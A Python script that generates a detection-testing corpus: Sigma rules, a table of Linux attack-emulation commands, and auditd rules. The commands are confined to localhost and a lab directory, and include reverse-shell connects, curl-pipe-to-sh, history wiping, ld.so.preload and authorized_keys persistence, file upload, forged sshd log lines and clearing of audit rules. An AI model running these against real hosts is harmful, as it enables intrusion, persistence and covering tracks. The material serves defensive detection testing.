#!/usr/bin/env python3
"""Generate the sigdiff corpus: Sigma rules, technique specs, auditd rule list.

One spec table -> everything. The generator asserts the cross-references:
every rule stem is expected by at least one technique, every expected stem
exists as a rule, no stem is expected by a technique that forbids it. The
corpus is therefore self-consistent by construction, and `sigdiff replay`
re-checks it offline against the recorded fixtures.
"""

from __future__ import annotations

import uuid
from pathlib import Path

import yaml

ROOT = Path(__file__).resolve().parents[1]

# ---------------------------------------------------------------------------
# Sigma rules
# (stem, title, level, mitre-tags, logsource, detection)
# logsource keys: category / service / product (all default to linux product)
# ---------------------------------------------------------------------------

def P(sel: dict) -> dict:  # single selection rule
    return {"selection": sel, "condition": "selection"}


PCAT = {"product": "linux", "category": "process_creation"}
FCAT = {"product": "linux", "category": "file_create"}
FDEL = {"product": "linux", "category": "file_delete"}
FMON = {"product": "linux", "category": "file_modify"}
NCAT = {"product": "linux", "category": "network_connection"}
SSH = {"product": "linux", "service": "sshd"}
SUDO = {"product": "linux", "service": "sudo"}
SYS = {"product": "linux", "service": "systemd"}
AD = {"product": "linux", "service": "auditd"}

RULES_A = [
    # ---- process_creation / auditd exec -------------------------------------------------
    ("revshell-bash-devtcp", "Reverse shell via bash /dev/tcp redirection", "high",
     ["attack.command-and-control", "attack.T1059.004"], PCAT,
     P({"CommandLine|contains": "/dev/tcp/"})),
    ("revshell-python-socket", "Python socket connect one-liner (hand-rolled reverse shell)", "high",
     ["attack.command-and-control", "attack.T1090"], PCAT,
     P({"CommandLine|contains": "socket.socket"})),
    ("curl-pipe-shell", "curl output piped straight to sh", "high",
     ["attack.T1105", "attack.execution"], PCAT,
     {"sel_curl": {"CommandLine|contains": "curl"},
      "sel_pipe": {"CommandLine|contains": "| sh"},
      "condition": "sel_curl and sel_pipe"}),
    ("base64-decoded-exec", "base64 decode in the command line (staged payload)", "medium",
     ["attack.T1140"], PCAT,
     P({"CommandLine|contains": ["base64 -d", "base64 --decode", "openssl base64"]})),
    ("rm-shell-history", "Shell history file removed or overwritten", "high",
     ["attack.T1070.003"], PCAT,
     P({"CommandLine|contains": ".bash_history"})),
    ("history-env-modified", "HISTFILE emptied or history cleared in-shell", "medium",
     ["attack.T1070.003"], PCAT,
     P({"CommandLine|contains": ["unset HISTFILE", "history -c", "HISTFILE=/dev/null"]})),
    ("recon-whoami-id", "Basic discovery: whoami / id / uname / hostname", "low",
     ["attack.T1033", "attack.T1087"], PCAT,
     P({"Image|endswith": ["/whoami", "/id", "/uname", "/hostname"]})),
    ("recon-ip-address", "Discovery of network configuration (ip/ifconfig)", "low",
     ["attack.T1016"], PCAT,
     P({"CommandLine|contains": ["ip addr", "ifconfig"]})),
    ("recon-socket-enumeration", "Socket/connection enumeration (ss, netstat)", "low",
     ["attack.T1049"], PCAT,
     P({"CommandLine|contains": ["ss -", "netstat"]})),
    ("recon-nmap-scan", "nmap invoked", "medium",
     ["attack.T1046"], PCAT,
     P({"Image|endswith": "/nmap"})),
    ("network-sniffing-tcpdump", "Packet capture tool invoked", "high",
     ["attack.T1040"], PCAT,
     P({"Image|endswith": "/tcpdump"})),
    ("kernel-module-load", "Kernel module loaded", "high",
     ["attack.T1547.006", "attack.T1215"], PCAT,
     P({"CommandLine|contains": ["modprobe ", "insmod ", "modprobe\t"]})),
    ("kernel-module-unload", "Kernel module unloaded", "medium",
     ["attack.T1547.006"], PCAT,
     P({"CommandLine|contains": "rmmod "})),
    ("sysctl-modification", "Kernel parameter changed live", "medium",
     ["attack.T1562", "attack.T1547"], PCAT,
     P({"CommandLine|contains": "sysctl -w"})),
    ("firewall-rule-added", "Host firewall rule inserted", "high",
     ["attack.T1562.004"], PCAT,
     P({"CommandLine|contains": ["iptables -I", "iptables -A", "nft add", "nft insert"]})),
    ("mount-loop-image", "Loop-mounted disk image (payload carrier pattern)", "medium",
     ["attack.T1083", "attack.defense-evasion"], PCAT,
     P({"CommandLine|contains": "mount -o loop"})),
    ("account-create-useradd", "Local account created", "high",
     ["attack.T1136.001"], PCAT,
     P({"CommandLine|contains": "useradd"})),
    ("account-modify-usermod", "Local account modified", "high",
     ["attack.T1098"], PCAT,
     P({"CommandLine|contains": "usermod"})),
    ("account-delete-userdel", "Local account deleted", "medium",
     ["attack.T1531"], PCAT,
     P({"CommandLine|contains": "userdel"})),
    ("privilege-elevation-sudo", "sudo binary executed", "low",
     ["attack.T1548.003"], PCAT,
     P({"Image|endswith": "/sudo"})),
    ("chmod-world-writable", "Mode set world-writable", "medium",
     ["attack.T1222.002"], PCAT,
     P({"CommandLine|contains": ["chmod 777", "chmod a+rwx", "chmod 666"]})),
    ("setuid-bit-granted", "setuid bit granted on a binary", "high",
     ["attack.T1548.001"], PCAT,
     P({"CommandLine|contains": ["chmod u+s", "chmod +s", "chmod 4755"]})),
    ("security-software-kill", "Process-killing tools invoked (agent-tampering pattern)", "medium",
     ["attack.T1562.001"], PCAT,
     P({"CommandLine|contains": ["pkill ", "killall "]})),
    ("archive-collected-data", "Data archived before exfiltration", "medium",
     ["attack.T1560.001"], PCAT,
     P({"CommandLine|contains": ["tar -c", "tar czf", "tar -czf", "zip ", "gzip "]})),
    ("collection-etc-sources", "tar pointed at /etc configuration directly", "medium",
     ["attack.T1005", "attack.T1039"], PCAT,
     {"sel_tar": {"CommandLine|contains": "tar"},
      "sel_etc": {"CommandLine|contains": " /etc/"},
      "condition": "sel_tar and sel_etc"}),
    ("exfil-upload-curl", "curl explicit file upload (-T/--upload-file)", "high",
     ["attack.T1041", "attack.T1567"], PCAT,
     P({"CommandLine|contains": ["curl -s -T", "curl -T", "curl --upload"]})),
    ("ingress-tool-transfer", "Download over http(s) with curl/wget", "medium",
     ["attack.T1105"], PCAT,
     {"sel_tool": {"CommandLine|contains": ["curl", "wget"]},
      "sel_http": {"CommandLine|contains": "http://"},
      "condition": "sel_tool and sel_http"}),
    ("dmesg-cleared", "Kernel ring buffer cleared", "high",
     ["attack.T1562.002"], PCAT,
     P({"CommandLine|contains": ["dmesg -C", "dmesg --clear"]})),
    ("logger-exec-injection", "logger invoked (log-injection vector: forged syslog lines)", "medium",
     ["attack.T1562.002", "attack.T1070.002"], PCAT,
     P({"Image|endswith": "/logger"})),
    ("audit-rule-added", "auditd rule added at runtime", "low",
     ["attack.T1562.001"], AD,
     {"sel_add": {"op": "add_rule"},
      "condition": "sel_add"}),
    ("audit-rules-cleared", "auditd rules cleared at runtime (log-collection tampering)", "high",
     ["attack.T1562.001"], AD,
     {"sel_del": {"op": "remove_rule"},
      "condition": "sel_del"}),

    # ---- file events / auditd ------------------------------------------------------------
    ("ld-preload-modified", "/etc/ld.so.preload written", "high",
     ["attack.T1546.006"], FMON,
     P({"TargetFilename|equals": "/etc/ld.so.preload"})),
    ("ld-preload-deleted", "/etc/ld.so.preload deleted", "high",
     ["attack.T1546.006", "attack.T1070"], FDEL,
     P({"TargetFilename|equals": "/etc/ld.so.preload"})),
    ("passwd-file-modified", "/etc/passwd modified", "medium",
     ["attack.T1098"], FMON,
     P({"TargetFilename|equals": "/etc/passwd"})),
    ("shadow-file-modified", "/etc/shadow modified", "high",
     ["attack.T1098"], FMON,
     P({"TargetFilename|equals": "/etc/shadow"})),
    ("sudoers-dropin-created", "File created under /etc/sudoers.d", "high",
     ["attack.T1548.003"], FCAT,
     P({"TargetFilename|startswith": "/etc/sudoers.d/"})),
    ("cron-file-created", "File created under /etc/cron.d", "high",
     ["attack.T1053.003"], FCAT,
     P({"TargetFilename|startswith": "/etc/cron.d/"})),
    ("cron-file-removed", "File removed under /etc/cron.d", "medium",
     ["attack.T1053.003", "attack.T1070"], FDEL,
     P({"TargetFilename|startswith": "/etc/cron.d/"})),
    ("systemd-unit-created", "Unit file created under /etc/systemd/system", "high",
     ["attack.T1543.002"], FCAT,
     P({"TargetFilename|startswith": "/etc/systemd/system/"})),
    ("systemd-unit-removed", "Unit file removed from /etc/systemd/system", "medium",
     ["attack.T1543.002", "attack.T1070"], FDEL,
     P({"TargetFilename|startswith": "/etc/systemd/system/"})),
    ("authorized-keys-modified", "SSH authorized_keys touched", "high",
     ["attack.T1098.004"], FMON,
     P({"TargetFilename|endswith": "/authorized_keys"})),
    ("authorized-keys-removed", "SSH authorized_keys deleted", "medium",
     ["attack.T1098.004", "attack.T1070"], FDEL,
     P({"TargetFilename|endswith": "/authorized_keys"})),
    ("bashrc-modified", "Shell rc file modified", "high",
     ["attack.T1546.004"], FMON,
     P({"TargetFilename|endswith": ["/.bashrc", "/.zshrc", "/.bash_profile"]})),
    ("history-file-deleted", "Shell history file deleted", "high",
     ["attack.T1070.003"], FDEL,
     P({"TargetFilename|endswith": "/.bash_history"})),
    ("lab-artifact-created", "File created under the lab workdir", "low",
     ["attack.T1105"], FCAT,
     P({"TargetFilename|startswith": "/tmp/sigdiff-lab/"})),
    ("lab-log-created", "File created under /var/log/sigdiff-lab", "low",
     ["attack.T1070"], FCAT,
     P({"TargetFilename|startswith": "/var/log/sigdiff-lab/"})),
    ("lab-log-deleted", "Lab log file deleted (local log tampering)", "high",
     ["attack.T1070.002"], FDEL,
     P({"TargetFilename|startswith": "/var/log/sigdiff-lab/"})),

    # ---- network / auditd connect ---------------------------------------------------------
    ("suspicious-outbound-4444", "Outbound connect to port 4444 (metasploit default)", "high",
     ["attack.T1571"], NCAT,
     P({"DestinationPort": "4444"})),
    ("suspicious-outbound-1337", "Outbound connect to port 1337", "medium",
     ["attack.T1571"], NCAT,
     P({"DestinationPort": "1337"})),
    ("lab-http-channel", "Connect to the lab exfil channel 127.0.0.1:8099", "low",
     ["attack.T1041"], NCAT,
     {"sel_ip": {"DestinationIP": "127.0.0.1"},
      "sel_port": {"DestinationPort": "8099"},
      "condition": "sel_ip and sel_port"}),

    # ---- auth (syslog-parsed sshd / sudo) --------------------------------------------------
    ("ssh-accepted-password", "SSH login accepted with password", "medium",
     ["attack.T1078.004"], SSH,
     {"sel_ok": {"Action": "accepted"},
      "sel_pw": {"Method|contains": "password"},
      "condition": "sel_ok and sel_pw"}),
    ("ssh-accepted-external", "SSH login accepted from the TEST-NET lab range", "high",
     ["attack.T1078.004"], SSH,
     {"sel_ok": {"Action": "accepted"},
      "sel_net": {"SourceIP|startswith": "203.0.113."},
      "condition": "sel_ok and sel_net"}),
    ("ssh-failed-password", "SSH authentication failure", "high",
     ["attack.T1110.001"], SSH,
     P({"Action": "failed"})),
    ("ssh-session-opened", "SSH session opened", "medium",
     ["attack.T1078.004"], SSH,
     P({"Action": "session_opened"})),
    ("sudo-command-executed", "sudo ran a command (session log)", "low",
     ["attack.T1548.003"], SUDO,
     P({"Action": "command"})),
    ("sudo-auth-failed", "sudo authentication failure", "high",
     ["attack.T1110.001"], SUDO,
     P({"Action": "auth_fail"})),

    # ---- journald ---------------------------------------------------------------------------
    ("lab-unit-started", "Lab systemd unit started", "medium",
     ["attack.T1543.002"], SYS,
     {"sel_unit": {"Unit": "sigdiff-lab-probe.service"},
      "sel_started": {"Message|contains": "Started"},
      "condition": "sel_unit and sel_started"}),
    ("lab-unit-stopped", "Lab systemd unit deactivated", "medium",
     ["attack.T1543.002"], SYS,
     {"sel_unit": {"Unit": "sigdiff-lab-probe.service"},
      "sel_stop": {"Message|contains": ["Deactivated successfully", "Stopped sigdiff lab probe"]},
      "condition": "sel_unit and sel_stop"}),
]

# rules-b: the ablation set — three targeted detections dropped, two sloppy
# broad rules added. Same events, different story.
RULES_B_REMOVED = {"suspicious-outbound-1337", "ssh-session-opened", "history-env-modified"}
RULES_B_ADDED = [
    ("loose-any-bash", "Any bash invocation (broad, sloppy)", "low", ["attack.execution"], PCAT,
     P({"Image|endswith": "/bash"})),
    ("loose-etc-touch", "Any file event touching /etc (broad, sloppy)", "low", ["attack.T1005"], FMON,
     P({"TargetFilename|contains": "/etc/"})),
]

# ---------------------------------------------------------------------------
# techniques: id, title, mitre ids, command (single bash string), needs_root,
# expect_hits, forbid_hits
# ---------------------------------------------------------------------------

SERVE = ("python3 -m http.server 8099 --bind 127.0.0.1 >/dev/null 2>&1 & "
         "SRV=$!; sleep 0.5; ")
TECHNIQUES = [
    ("revshell-devtcp", "Bash /dev/tcp reverse shell", ["T1059.004", "T1571"],
     "bash -c 'exec 3<>/dev/tcp/127.0.0.1/4444 && echo sigdiff-hand >&3 && exec 3<&- && exec 3>&-' 2>/dev/null || true",
     False, ["revshell-bash-devtcp", "suspicious-outbound-4444"],
     ["ld-preload-modified", "ssh-accepted-external", "systemd-unit-created"]),
    ("revshell-python", "Python socket connect (hand-rolled backconnect)", ["T1090", "T1571"],
     "python3 -c 'import socket;s=socket.socket();s.connect((\"127.0.0.1\",1337))' 2>/dev/null || true",
     False, ["revshell-python-socket", "suspicious-outbound-1337"],
     ["curl-pipe-shell", "setuid-bit-granted"]),
    ("curl-pipe-sh", "curl fetched script piped to sh", ["T1105"],
     SERVE + "echo 'echo sigdiff-executed' > fetchme.sh && curl -s http://127.0.0.1:8099/fetchme.sh | sh; kill $SRV 2>/dev/null",
     False, ["curl-pipe-shell", "ingress-tool-transfer", "lab-http-channel", "lab-artifact-created"],
     ["setuid-bit-granted", "ld-preload-modified"]),
    ("base64-stage", "base64-decoded payload string", ["T1140"],
     "base64 -d <<< 'ZWNobyBzaWdkaWZmLXN0YWdl' > staged.sh && sh staged.sh",
     False, ["base64-decoded-exec", "lab-artifact-created"],
     ["suspicious-outbound-4444", "bashrc-modified"]),
    ("history-shred", "Bash history file written then removed", ["T1070.003"],
     "echo sigdiff-cmd >> /home/meowman/.bash_history && rm -f /home/meowman/.bash_history",
     False, ["rm-shell-history", "history-file-deleted"],
     ["ld-preload-modified", "ssh-failed-password"]),
    ("history-env", "HISTFILE neutered inside a shell", ["T1070.003"],
     "bash -c 'HISTFILE=/dev/null; history -c; unset HISTFILE'",
     False, ["history-env-modified"],
     ["rm-shell-history", "authorized-keys-modified"]),
    ("discovery-basic", "whoami / id / uname / hostname", ["T1033", "T1087.001", "T1082"],
     "whoami; id; uname -a; hostname",
     False, ["recon-whoami-id"],
     ["revshell-bash-devtcp", "ssh-session-opened"]),
    ("discovery-netinfo", "ip addr + ss enumeration", ["T1016", "T1049"],
     "ip addr; ss -ant",
     False, ["recon-ip-address", "recon-socket-enumeration"],
     ["suspicious-outbound-4444", "cron-file-created"]),
    ("discovery-nmap", "nmap port probe against loopback", ["T1046"],
     "nmap -Pn --max-retries 1 -p 9,19 127.0.0.1 >/dev/null 2>&1 || true",
     False, ["recon-nmap-scan"],
     ["revshell-bash-devtcp", "setuid-bit-granted"]),
    ("sniff-tcpdump", "tcpdump on loopback", ["T1040"],
     "tcpdump -c 3 -i lo -nn -w /tmp/sigdiff-lab/work/sigdiff-sniff.pcap 2>/dev/null || true; rm -f /tmp/sigdiff-lab/work/sigdiff-sniff.pcap",
     True, ["network-sniffing-tcpdump", "lab-artifact-created", "sudo-command-executed"],
     ["suspicious-outbound-1337", "lab-unit-started"]),
    ("module-load", "modprobe/rmmod a harmless module", ["T1547.006"],
     "modprobe loop 2>/dev/null || true; rmmod loop 2>/dev/null || true; ls /tmp/sigdiff-lab >/dev/null",
     True, ["kernel-module-load", "kernel-module-unload", "sudo-command-executed"],
     ["ssh-accepted-password", "cron-file-created"]),
    ("sysctl-tweak", "sysctl -w live kernel parameter change", ["T1547"],
     "sysctl -w kernel.shm_rmid_forced=1 >/dev/null; sysctl -w kernel.shm_rmid_forced=0 >/dev/null",
     True, ["sysctl-modification", "sudo-command-executed"],
     ["kernel-module-load", "authorized-keys-modified"]),
    ("firewall-insert", "iptables rule inserted then removed", ["T1562.004"],
     "iptables -I INPUT -s 203.0.113.0/24 -j DROP && iptables -D INPUT -s 203.0.113.0/24 -j DROP",
     True, ["firewall-rule-added", "sudo-command-executed"],
     ["suspicious-outbound-4444", "bashrc-modified"]),
    ("account-lifecycle", "useradd -> usermod -> userdel", ["T1136.001", "T1098", "T1531"],
     "useradd -M sigdiff-lab-u 2>/dev/null; usermod -aG users sigdiff-lab-u; userdel -r sigdiff-lab-u 2>/dev/null || true",
     True, ["account-create-useradd", "account-modify-usermod", "account-delete-userdel",
            "passwd-file-modified", "shadow-file-modified", "sudo-command-executed"],
     ["suspicious-outbound-1337", "ld-preload-modified"]),
    ("priv-elev-sudo", "plain sudo execution", ["T1548.003"],
     "id -u; ls /tmp/sigdiff-lab >/dev/null",
     True, ["privilege-elevation-sudo", "sudo-command-executed"],
     ["firewall-rule-added", "authorized-keys-modified"]),
    ("persist-ldpreload", "/etc/ld.so.preload planted then removed", ["T1546.006"],
     "touch /tmp/sigdiff-lab/work/sigdiff-hook.so && echo /tmp/sigdiff-lab/work/sigdiff-hook.so > /etc/ld.so.preload && rm /etc/ld.so.preload",
     True, ["ld-preload-modified", "ld-preload-deleted", "lab-artifact-created", "sudo-command-executed"],
     ["suspicious-outbound-4444", "ssh-failed-password"]),
    ("persist-cron", "cron.d entry planted then removed", ["T1053.003"],
     "echo '* * * * * root /bin/true # sigdiff-lab' > /etc/cron.d/sigdiff-lab && rm /etc/cron.d/sigdiff-lab",
     True, ["cron-file-created", "cron-file-removed", "sudo-command-executed"],
     ["suspicious-outbound-1337", "bashrc-modified"]),
    ("persist-sudoersd", "sudoers drop-in created then removed", ["T1548.003"],
     "echo 'Defaults lecture=\"never\" # sigdiff-lab' > /etc/sudoers.d/sigdiff-lab && rm /etc/sudoers.d/sigdiff-lab",
     True, ["sudoers-dropin-created", "sudo-command-executed"],
     ["suspicious-outbound-4444", "cron-file-created"]),
    ("persist-unit", "systemd unit planted, started, stopped, removed", ["T1543.002"],
     "printf '[Unit]\\nDescription=sigdiff lab probe\\n[Service]\\nExecStart=/bin/sleep 60\\n' > /etc/systemd/system/sigdiff-lab-probe.service "
     "&& systemctl daemon-reload && systemctl start sigdiff-lab-probe.service && sleep 0.5 "
     "&& systemctl stop sigdiff-lab-probe.service && rm /etc/systemd/system/sigdiff-lab-probe.service && systemctl daemon-reload",
     True, ["systemd-unit-created", "systemd-unit-removed", "lab-unit-started", "lab-unit-stopped",
            "sudo-command-executed"],
     ["suspicious-outbound-1337", "ssh-accepted-password"]),
    ("persist-sshkey", "authorized_keys appended then cleaned", ["T1098.004"],
     "mkdir -p /home/meowman/.ssh && chmod 700 /home/meowman/.ssh; ssh-keygen -q -t ed25519 -N '' -f sigdiff-lab-key >/dev/null 2>&1 "
     "&& cat sigdiff-lab-key.pub >> /home/meowman/.ssh/authorized_keys; rm -f /home/meowman/.ssh/authorized_keys sigdiff-lab-key sigdiff-lab-key.pub",
     False, ["authorized-keys-modified", "authorized-keys-removed", "lab-artifact-created"],
     ["suspicious-outbound-4444", "shadow-file-modified"]),
    ("persist-bashrc", "shell rc line appended, then rewritten out", ["T1546.004"],
     "echo '# sigdiff-lab-marker' >> /home/meowman/.bashrc "
     "&& grep -v sigdiff-lab-marker /home/meowman/.bashrc > rc.tmp "
     "&& cat rc.tmp > /home/meowman/.bashrc && rm rc.tmp",
     False, ["bashrc-modified"],
     ["suspicious-outbound-1337", "ld-preload-modified"]),
    ("collect-tar", "tar of /etc files staged for exfil", ["T1560.001", "T1005"],
     "tar -czf sigdiff-collect.tgz /etc/hostname /etc/hosts",
     False, ["archive-collected-data", "collection-etc-sources", "lab-artifact-created"],
     ["suspicious-outbound-4444", "authorized-keys-modified"]),
    ("exfil-upload", "curl -T upload to the lab channel", ["T1041"],
     SERVE + "tar -czf sigdiff-collect.tgz /etc/hostname && curl -s -T sigdiff-collect.tgz http://127.0.0.1:8099/upload.html; kill $SRV 2>/dev/null; true",
     False, ["exfil-upload-curl", "ingress-tool-transfer", "lab-http-channel",
             "archive-collected-data", "collection-etc-sources", "lab-artifact-created"],
     ["ssh-failed-password", "lab-unit-started"]),
    ("chmod-777", "world-writable mode set on lab file", ["T1222.002"],
     "echo sigdiff > blob.bin && chmod 777 blob.bin",
     False, ["chmod-world-writable", "lab-artifact-created"],
     ["setuid-bit-granted", "suspicious-outbound-1337"]),
    ("setuid-copy", "setuid bit granted on a copied binary", ["T1548.001"],
     "cp /bin/sleep sg-sleep && chmod u+s sg-sleep && rm -f sg-sleep",
     False, ["setuid-bit-granted", "lab-artifact-created"],
     ["chmod-world-writable", "bashrc-modified"]),
    ("kill-agent", "pkill against a non-existent agent name", ["T1562.001"],
     "pkill -9 -x sigdiff-agent-absent 2>/dev/null || true",
     False, ["security-software-kill"],
     ["lab-unit-stopped", "suspicious-outbound-4444"]),
    ("dmesg-clear", "kernel ring buffer cleared", ["T1562.002"],
     "dmesg -C; ls /tmp/sigdiff-lab >/dev/null",
     True, ["dmesg-cleared", "sudo-command-executed"],
     ["suspicious-outbound-1337", "cron-file-created"]),
    ("log-tamper-lab", "lab log file created then deleted", ["T1070.002"],
     "echo sigdiff-line > /var/log/sigdiff-lab/sigdiff-run.log && rm /var/log/sigdiff-lab/sigdiff-run.log",
     True, ["lab-log-created", "lab-log-deleted", "sudo-command-executed"],
     ["suspicious-outbound-4444", "authorized-keys-modified"]),
    ("mount-loop", "loop-mount image then unmount", ["T1083"],
     "truncate -s 4M sigdiff-disk.img && mkdir -p mnt && mount -o loop sigdiff-disk.img mnt && umount mnt; rm -f sigdiff-disk.img",
     True, ["mount-loop-image", "lab-artifact-created", "sudo-command-executed"],
     ["suspicious-outbound-1337", "bashrc-modified"]),
    ("ssh-inject-login", "forged sshd accepted-login lines (TEST-NET client)", ["T1078.004"],
     "logger -t sshd 'Accepted password for sigdiff-user from 203.0.113.10 port 40022 ssh2' "
     "&& logger -t sshd 'pam_unix(sshd:session): session opened for user sigdiff-user(uid=1000) by (uid=0) (from 203.0.113.10)'",
     False, ["ssh-accepted-password", "ssh-accepted-external", "ssh-session-opened", "logger-exec-injection"],
     ["ssh-failed-password", "sudo-auth-failed"]),
    ("ssh-inject-brute", "forged sshd failures from one TEST-NET source", ["T1110.001"],
     "logger -t sshd 'Failed password for invalid user admin from 203.0.113.11 port 41001 ssh2' "
     "&& logger -t sshd 'Failed password for invalid user admin from 203.0.113.11 port 41002 ssh2' "
     "&& logger -t sshd 'Failed password for invalid user admin from 203.0.113.11 port 41003 ssh2'",
     False, ["ssh-failed-password", "logger-exec-injection"],
     ["ssh-accepted-password", "ssh-accepted-external"]),
    ("sudo-inject-authfail", "forged sudo auth-failure line", ["T1110.001"],
     "logger -t sudo 'sigdiff-lab: 3 incorrect password attempts for meowman on tty pts/0 (uid=1000)'",
     False, ["sudo-auth-failed", "logger-exec-injection"],
     ["ssh-failed-password", "sudo-command-executed"]),
    ("control-benign", "CONTROL: ordinary user behavior in the lab dir (false-positive check)", [],
     "ls -la; date; head -1 /etc/hostname > note.txt; cat note.txt; echo sigdiff >> note.txt; rm note.txt",
     False, ["lab-artifact-created"],
     ["revshell-bash-devtcp", "curl-pipe-shell", "base64-decoded-exec", "rm-shell-history",
      "recon-nmap-scan", "network-sniffing-tcpdump", "account-create-useradd",
      "cron-file-created", "chmod-world-writable", "setuid-bit-granted", "security-software-kill",
      "archive-collected-data", "exfil-upload-curl", "dmesg-cleared", "mount-loop-image",
      "ssh-failed-password", "sudo-auth-failed", "ld-preload-modified", "bashrc-modified",
      "authorized-keys-modified", "systemd-unit-created", "suspicious-outbound-4444",
      "audit-rules-cleared"]),
    # last: this technique clears all auditd rules, so nothing can be captured
    # after it in the same run
    ("audit-tamper-last", "runtime audit rule churn: add, delete, clear-all", ["T1562.001"],
     "auditctl -a exit,always -F arch=b64 -S execve -F auid=1000 -k sigdiff-temp; "
     "auditctl --delete exit,always -F arch=b64 -S execve -F auid=1000 -k sigdiff-temp; "
     "auditctl -D; true",
     True, ["audit-rule-added", "audit-rules-cleared", "sudo-command-executed"],
     ["suspicious-outbound-4444", "ssh-failed-password"]),
]

AUDIT_RULES = """# sigdiff live-telemetry collection rules.
# Installed by `sigdiff run` (as root), removed afterwards. The lab boundary
# is the workdir + the watched persistence/log files + this lab user's audit
# identity; everything else on the box never enters a baseline window.
-a exit,always -F arch=b64 -S all -F dir=/tmp/sigdiff-lab -F perm=wa -k sd_file
-a exit,always -F arch=b64 -S all -F path=/etc/ld.so.preload -F perm=wa -k sd_file
-a exit,always -F arch=b64 -S all -F dir=/etc/cron.d -F perm=wa -k sd_file
-a exit,always -F arch=b64 -S all -F dir=/etc/systemd/system -F perm=wa -k sd_file
-a exit,always -F arch=b64 -S all -F path=/etc/passwd -F perm=wa -k sd_file
-a exit,always -F arch=b64 -S all -F path=/etc/shadow -F perm=wa -k sd_file
-a exit,always -F arch=b64 -S all -F path=/etc/gshadow -F perm=wa -k sd_file
-a exit,always -F arch=b64 -S all -F path=/etc/sudoers -F perm=wa -k sd_file
-a exit,always -F arch=b64 -S all -F dir=/etc/sudoers.d -F perm=wa -k sd_file
-a exit,always -F arch=b64 -S all -F dir=/home/meowman -F perm=wa -k sd_file
-a exit,always -F arch=b64 -S all -F dir=/home/meowman/.ssh -F perm=wa -k sd_file
-a exit,always -F arch=b64 -S all -F dir=/var/log/sigdiff-lab -F perm=wa -k sd_file
-a exit,always -F arch=b64 -S execve,execveat -F auid=1000 -k sd
-a exit,always -F arch=b64 -S connect -F auid=1000 -k sd
-a exit,always -F arch=b64 -S mount,umount2 -F auid=1000 -k sd
-a exit,always -F arch=b64 -S init_module,finit_module,delete_module -F auid=1000 -k sd
"""


def stem_uuid(stem: str) -> str:
    return str(uuid.uuid5(uuid.NAMESPACE_DNS, "sigdiff.rule." + stem))


def emit_rule(stem: str, title: str, level: str, tags: list[str],
              logsource: dict, detection: dict) -> str:
    doc = {
        "title": title,
        "id": stem_uuid(stem),
        "status": "stable",
        "description": f"sigdiff generated rule ({stem}).",
        "author": "Hadi Abdulrahman",
        "logsource": logsource,
        "detection": detection,
        "level": level,
        "tags": tags,
    }
    return yaml.safe_dump(doc, sort_keys=False, width=88)


def main() -> None:
    rules_a = {stem for stem, *_ in RULES_A}
    rules_b = {stem for stem, *_ in RULES_A} - RULES_B_REMOVED | {s for s, *_ in RULES_B_ADDED}

    expected: set[str] = set()
    forbade: dict[str, set[str]] = {}
    for tid, _t, _m, _c, _r, exp, forb in TECHNIQUES:
        exp = [e for e in exp if not e.endswith("?none")]
        expected.update(exp)
        forbade[tid] = set(forb)
        for f in forb:
            assert f not in exp, f"{tid}: forbids its own expected rule {f}"

    stems = [r[0] for r in RULES_A] + [r[0] for r in RULES_B_ADDED]
    assert len(stems) == len(set(stems)), "duplicate rule stems"
    unknown = expected - set(stems)
    assert not unknown, f"expected stems with no rule: {sorted(unknown)}"
    orphan = rules_a - expected
    assert not orphan, f"rules_a never expected by any technique: {sorted(orphan)}"

    for d, specs in (("rules", RULES_A), ):
        out = ROOT / d
        out.mkdir(parents=True, exist_ok=True)
        for old in out.glob("*.yml"):
            old.unlink()
        for stem, title, level, tags, ls, det in specs:
            (out / f"{stem}.yml").write_text(emit_rule(stem, title, level, tags, ls, det),
                                             encoding="utf-8")
    outb = ROOT / "rules-b"
    outb.mkdir(parents=True, exist_ok=True)
    for old in outb.glob("*.yml"):
        old.unlink()
    spec_by_stem = {r[0]: r for r in RULES_A}
    for stem in sorted(rules_b):
        if stem in spec_by_stem:
            s, title, level, tags, ls, det = spec_by_stem[stem]
        else:
            s, title, level, tags, ls, det = next(r for r in RULES_B_ADDED if r[0] == stem)
        (outb / f"{stem}.yml").write_text(emit_rule(s, title, level, tags, ls, det),
                                          encoding="utf-8")

    tech_doc = {"techniques": [
        {"id": tid, "title": title, "mitre": mitre, "command": cmd, "needs_root": root,
         "expect_hits": [e for e in exp if not e.endswith("?none")], "forbid_hits": forb,
         # journal-only forges are idempotent: the runner may re-run them once
         # if journald dropped a line (see runner.run_all)
         "allow_replay": cmd.lstrip().startswith("logger")}
        for tid, title, mitre, cmd, root, exp, forb in TECHNIQUES
    ]}
    (ROOT / "techniques").mkdir(parents=True, exist_ok=True)
    (ROOT / "techniques" / "techniques.yml").write_text(
        yaml.safe_dump(tech_doc, sort_keys=False, width=96), encoding="utf-8")

    (ROOT / "audit").mkdir(parents=True, exist_ok=True)
    (ROOT / "audit" / "rules.list").write_text(AUDIT_RULES, encoding="utf-8")

    print(f"rules/{len(RULES_A)} · rules-b/{len(rules_b)} · techniques/{len(TECHNIQUES)} "
          f"· expected-stems/{len(expected)}")
    missing_in_b = sorted(rules_b ^ rules_a)
    print(f"rules-b differs from rules in: {missing_in_b}")


if __name__ == "__main__":
    main()
